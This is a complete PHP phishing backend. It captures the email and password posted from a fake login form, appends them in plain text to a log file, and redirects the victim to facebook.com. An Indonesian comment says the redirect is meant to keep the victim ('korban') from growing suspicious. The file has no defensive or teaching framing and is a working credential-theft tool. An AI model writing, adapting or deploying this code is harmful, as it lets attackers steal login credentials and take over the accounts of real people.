<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $email = $_POST['email'];
  $pass = $_POST['pass'];
  $log = fopen("log.txt", "a");
  fwrite($log, "Email: $email | Pass: $pass\n");
  fclose($log);
}
header("Location: https://facebook.com"); // redirect biar korban nggak curiga
exit;
?>